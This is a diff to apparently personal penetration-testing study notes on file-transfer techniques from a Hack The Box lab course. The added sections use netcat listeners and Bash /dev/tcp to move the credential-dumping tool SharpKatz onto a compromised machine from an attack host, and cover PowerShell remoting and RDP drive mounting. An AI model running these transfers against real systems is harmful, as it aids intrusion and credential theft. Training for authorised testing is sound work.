@@ -24,6 +24,7 @@
     - [Upload files](#upload-files)
 - [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
     - [Netcat / Ncat](#netcat--ncat)
+    - [PowerShell Session File Transfer](#powershell-session-file-transfer)
 
 
 
@@ -396,6 +397,7 @@ You can't access this shared folder because your organization's security policie
 
 ## Miscellaneous File Transfer Methods
 ### Netcat / Ncat
+
 - The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
 - **Steps**
     1. We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename:
@@ -417,7 +419,7 @@ You can't access this shared folder because your organization's security policie
     abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
     ```
 
-> [!TIP]
+> [!NOTE]
 > Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
 > ```bash
 > # Attack Host
@@ -436,3 +438,76 @@ You can't access this shared folder because your organization's security policie
 > victim@target:~$ # Example using Ncat
 > victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 > ```
+
+> [!TIP]
+> If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/. Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.
+> ```
+> # Attack Host
+> abdeonix@htb[/htb]$ # Example using Original Netcat
+> abdeonix@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+> 
+> abdeonix@htb[/htb]$ # Example using Ncat
+> abdeonix@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+> 
+> # Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
+> victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+> ```
+> Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.
+
+### PowerShell Session File Transfer
+- We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.
+
+- PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
+- By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+- **Steps**
+    1. From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
+    ```powershell
+    PS C:\htb> whoami
+
+    htb\administrator
+
+    PS C:\htb> hostname
+
+    DC01
+    ```
+    ```powershell
+    PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+    ComputerName     : DATABASE01
+    RemoteAddress    : 192.168.1.101
+    RemotePort       : 5985
+    InterfaceAlias   : Ethernet0
+    SourceAddress    : 192.168.1.100
+    TcpTestSucceeded : True
+    ```
+
+    2. Create a PowerShell Remoting Session to DATABASE01
+    ```powershell
+    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+    ```
+
+    3. We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
+    ```powershell
+    # Copy samplefile.txt from our Localhost to the DATABASE01 Session
+    PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+    
+    # Copy DATABASE.txt from DATABASE01 Session to our Localhost
+    PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+
+    ```
+
+### RDP 
+- We can copy and paste using RDP sessions, but there may be scenarios where this may not work as expected.
+
+- As an alternative to copy and paste, we can mount a local resource on the target RDP server.
+
+```bash
+# Mounting a Linux Folder Using xfreerdp
+
+abdeonix@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+
+```
+- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.
+
+![RDP file transfer](/images/RDP%20File%20transfer.jpg)
